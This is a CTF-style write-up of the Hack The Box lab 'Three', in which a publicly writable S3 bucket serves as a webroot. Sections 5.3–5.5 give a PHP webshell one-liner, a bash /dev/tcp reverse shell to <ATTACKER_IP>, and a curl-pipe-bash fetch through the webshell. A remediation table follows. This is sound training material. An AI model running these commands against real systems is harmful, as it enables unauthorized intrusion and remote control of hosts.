# Write-Up — Three: Misconfigured AWS S3 Bucket to Remote Code Execution

> **Type:** Web Application / Cloud Storage Penetration Test (HTB Starting Point)
> **Target:** `10.129.83.95` (`thetoppers.htb`)
> **Tools:** Nmap, Gobuster, awscli, ncat, Python HTTP server
> **Final Result:** Reverse shell via a PHP webshell uploaded to a publicly writable S3 bucket serving as the site's webroot

---

## 1. Introduction

The target is a Linux host running a website that uses an **AWS S3 bucket** (via LocalStack) as its cloud storage backend for the webroot. The objective was to enumerate the web application and its infrastructure, identify the misconfigured bucket, and abuse write access to it to achieve remote code execution.

This box illustrates a cloud-era spin on a classic finding:

- **Virtual host / subdomain routing** exposing an internal-facing S3 management subdomain that was never meant to be public.
- **A publicly writable S3 bucket** serving directly as the live webroot, with no authentication enforced on write operations.
- **Direct-to-RCE file upload** — since the bucket *is* the webroot, any file written to it is immediately executable by the web server.

---

## 2. Reconnaissance

### 2.1 Connectivity Check

```bash
ping 10.129.83.95
```

Successful replies confirmed the VPN tunnel was up and the target was reachable.

### 2.2 Port Scan — Nmap

```bash
nmap -sV -sC 10.129.83.95
```

Result:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Toppers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.6p1 (Ubuntu 4ubuntu0.7) |
| 80/tcp | HTTP | Apache 2.4.29 (Ubuntu) |

Two ports were found open. SSH was noted but not a viable path without credentials. The web server's title, **"The Toppers"**, was the first hint toward the site's branding and eventual domain name.

---

## 3. Website Enumeration

### 3.1 Initial Browsing

Visiting `http://10.129.83.95` displayed a static concert ticket booking page (non-functional). Reviewing the page source revealed:

- A "Contact" form submitting to `/action_page.php`.
- `/index.php` serving the same landing page.

Both confirmed a **PHP backend**. The Contact section also listed an email address using the domain `thetoppers.htb`.

### 3.2 Adding the Virtual Host Entry

```bash
echo "10.129.83.95 thetoppers.htb" | sudo tee -a /etc/hosts
```

This allowed the browser to resolve and correctly address `thetoppers.htb` directly, consistent with the Nmap-reported page title.

### 3.3 Subdomain Enumeration

```bash
gobuster vhost -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain
```

This uncovered a subdomain: **`s3.thetoppers.htb`**.

```bash
echo "10.129.83.95 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

Visiting `http://s3.thetoppers.htb` returned only:

```json
{"status": "running"}
```

— consistent with a LocalStack-emulated AWS S3 endpoint.

---

## 4. Vulnerability Analysis

### 4.1 Identifying the Flaw

With an S3-style endpoint confirmed, the next step was to interact with it using `awscli` to see what buckets and permissions were exposed.

### 4.2 The Vulnerability

- **CVE:** N/A — this is a cloud storage access-control misconfiguration, not a software bug
- **Type:** Publicly writable S3 bucket serving as the live application webroot
- **Authentication:** AWS credentials nominally required by the CLI, but the endpoint accepted arbitrary/placeholder values with no real verification
- **Impact:** Arbitrary file write directly into the served webroot, leading to remote code execution

---

## 5. Initial Access

### 5.1 Configuring awscli

```bash
apt install awscli
aws configure
```

Arbitrary placeholder values were supplied for the access key, secret key, region, and output format — sufficient for the CLI to function against the misconfigured endpoint.

### 5.2 Enumerating Buckets

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

This listed `index.php`, `.htaccess`, and an `images` directory — confirming the bucket **is** the Apache webroot for the site on port 80.

### 5.3 Crafting and Uploading a PHP Webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

### 5.4 Confirming Code Execution

```
http://thetoppers.htb/shell.php?cmd=id
```

The response returned the output of the `id` command, confirming remote code execution as the web server's process user.

### 5.5 Escalating to an Interactive Reverse Shell

Local attacking machine IP identified:

```bash
ifconfig
```

Reverse shell payload written locally:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/1337 0>&1
```

Listener started:

```bash
nc -nvlp 1337
```

Local web server started (from the directory containing `shell.sh`):

```bash
python3 -m http.server 8000
```

Payload triggered via the webshell, fetching and executing the reverse shell script:

```
http://thetoppers.htb/shell.php?cmd=curl+<ATTACKER_IP>:8000/shell.sh|bash
```

An interactive reverse shell was received on the listener.

### 5.6 Flag / Evidence

```bash
cat /var/www/flag.txt
```

This returned the lab's flag, submitted to the Starting Point page to mark the machine as complete.

> **Severity: Critical.** A cloud storage misconfiguration allowing unauthenticated write access to a live web application's document root, resulting directly in remote code execution.

---

## 6. Full Attack Chain

```
[ Recon: Nmap ]
       │
       ▼
[ SSH (22) + Apache/PHP (80) on Ubuntu ]
       │
       ▼
[ Contact form + email domain reveal thetoppers.htb ]
       │
       ▼
[ /etc/hosts entry added → landing page loads ]
       │
       ▼
[ Gobuster vhost enum → s3.thetoppers.htb discovered ]
       │
       ▼
[ S3-style endpoint confirmed ({"status": "running"}) ]
       │
       ▼
[ awscli configured with placeholder creds → bucket listed ]
       │
       ▼
[ Bucket contents match live webroot (index.php, .htaccess, images/) ]
       │
       ▼
[ shell.php uploaded via aws s3 cp ]
       │
       ▼
[ shell.php?cmd=id → RCE confirmed ]
       │
       ▼
[ Reverse shell triggered via curl | bash ]
       │
       ▼
[ /var/www/flag.txt read ]
```

**Lesson:** No credential brute-forcing, no software exploit, and no privilege escalation were required. The entire compromise was: find the storage backend, confirm it has no real access control, and write a file into a location the web server will execute.

---

## 7. Remediation Summary

| # | Finding | Severity | Remediation |
|---|---------|----------|--------------|
| 1 | S3 bucket accepts write operations without real authentication | **Critical** | Enforce IAM policies and bucket policies requiring valid, verified AWS credentials for any write (`PutObject`) operation; deny anonymous/placeholder-credential access entirely. |
| 2 | S3 bucket used directly as the live web application document root | **High** | Avoid serving application code directly from object storage; if used for static assets, separate code/executable content from the bucket and disable script execution on anything served from it. |
| 3 | Internal-facing S3 management subdomain (`s3.thetoppers.htb`) discoverable via subdomain brute-force | **Medium** | Do not expose cloud storage management endpoints on the same public-facing domain/network as the application; place them behind internal-only DNS and network segmentation. |
| 4 | No file-type or content restriction on objects uploaded to the bucket | **High** | Enforce content-type validation and restrict uploads to expected file types; strip or block execution rights for any uploaded file within the web server configuration. |
| 5 | Outbound connections from the web server not restricted, enabling the reverse shell callback | **Medium** | Apply egress filtering on web-facing hosts to permit only necessary outbound destinations/ports, limiting the impact of a webshell even after RCE is achieved. |

---

## 8. Conclusion

This box is a compact illustration of a principle that is becoming increasingly common as more infrastructure moves to the cloud:

1. **Cloud storage misconfigurations are the new "world-writable directory."** The impact here mirrors classic web-root file upload vulnerabilities, just relocated to an S3 bucket instead of an FTP or SMB share.
2. **Convenience configurations (arbitrary/placeholder credentials "just to make the CLI work") are a red flag, not a workaround.** If an endpoint accepts any credential value, it isn't authenticating at all.

The fix is the same discipline that applies everywhere else: any store that a web server executes content from must have write access locked down to strictly authenticated, authorized identities.